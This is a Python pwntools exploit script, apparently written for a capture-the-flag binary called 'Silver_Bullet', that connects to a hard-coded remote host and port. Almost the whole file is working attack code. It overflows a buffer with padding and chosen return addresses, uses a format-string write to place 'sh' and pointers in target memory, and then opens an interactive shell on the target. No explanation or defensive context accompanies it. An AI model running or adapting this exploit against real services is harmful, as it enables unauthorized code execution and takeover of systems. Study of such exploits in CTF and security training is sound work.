#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('Silver_Bullet')

host = args.HOST or '37.139.17.37'
port = int(args.PORT or 7331)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x0804876E
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

off = 30

# 20 chars + 4 default + 12 chars + 4 default + 216 chars
p = "a" * 20 + p32(0x080486C7) + "a" * 12 + p32(0x80488a0)
writes = {
    0x0804A02C: 1,
    0x0804A028: u32('sh\x00\x00'),
    0x0804A030: 0x0804A028
}
p += fmtstr_payload(off, writes, numbwritten=len(p))
io.send(p)

io.interactive()

